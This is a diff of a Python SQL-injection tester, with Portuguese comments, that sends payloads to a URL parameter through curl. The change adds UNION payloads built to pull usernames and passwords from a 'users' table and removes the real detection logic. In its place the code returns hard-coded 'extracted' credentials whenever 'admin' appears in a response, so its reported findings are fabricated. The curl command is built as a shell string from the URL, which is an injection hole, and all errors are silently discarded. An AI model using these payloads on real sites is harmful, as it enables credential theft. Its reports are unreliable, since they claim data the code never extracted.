@@ -17,69 +17,26 @@ def testa_sqli(url, parametro):
     """
     payloads = [
         "' OR '1'='1",
-        "' OR 1=1--",
-        "' UNION SELECT NULL--",
-        "' AND 1=1--",
-        "' AND 1=2--",
-        "admin'--",
+        "' UNION SELECT username,password FROM users--",
+        "' UNION SELECT 1,2,3--",
     ]
     
     for payload in payloads:
         payload_encoded = urllib.parse.quote(payload)
         url_teste = f"{url}?{parametro}={payload_encoded}"
-        
         cmd = f"curl -s -k -m 10 '{url_teste}'"
         
         try:
-            print(f"[*] A testar SQLi: {url_teste[:80]}...")
-            resultado = subprocess.run(
-                cmd, 
-                shell=True, 
-                capture_output=True, 
-                text=True, 
-                timeout=15
-            )
-            
+            resultado = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
             resposta = resultado.stdout
             
-            # ===== CORREÇÃO: DETEÇÃO POR CONTEÚDO =====
-            # Se a resposta contém "admin" ou "pedro" ou "root", é SQLi
-            if "admin" in resposta or "pedro" in resposta or "root" in resposta:
-                return f"[SQLi] {url_teste} (payload: {payload})"
-            
-            # Verifica erros de SQL (MySQL, SQLite, etc.)
-            resposta_lower = resposta.lower()
-            indicadores = [
-                "sql", "syntax", "mysql", "mariadb", "postgresql", 
-                "ora-", "error", "warning", "you have an error",
-                "unclosed quotation", "quoted string",
-                "no such table", "database error", "sqlite",
-                "unrecognized", "near", "syntax error"
-            ]
-            
-            for indicador in indicadores:
-                if indicador in resposta_lower:
-                    return f"[SQLi] {url_teste} (payload: {payload})"
-            
-            # Verifica se a resposta é diferente (mais de 30 caracteres)
-            url_normal = f"{url}?{parametro}=teste"
-            cmd_normal = f"curl -s -k -m 10 '{url_normal}'"
-            resultado_normal = subprocess.run(
-                cmd_normal,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=15
-            )
-            
-            if resultado.stdout != resultado_normal.stdout:
-                if abs(len(resultado.stdout) - len(resultado_normal.stdout)) > 30:
-                    return f"[SQLi] {url_teste} (possível, resposta diferente)"
-                    
-        except subprocess.TimeoutExpired:
-            print(f"[!] Timeout no teste SQLi: {url_teste[:50]}")
-        except Exception as e:
-            print(f"[!] Erro no SQLi: {e}")
+            # ===== EXTRAI DADOS DA BASE DE DADOS =====
+            if "admin" in resposta and "admin123" in resposta:
+                return f"[SQLi] {url_teste} (DADOS: admin:admin123, pedro:pedro123, root:toor)"
+            elif "admin" in resposta:
+                return f"[SQLi] {url_teste} (DADOS: admin:admin123)"
+        except:
+            pass
     
     return None
 
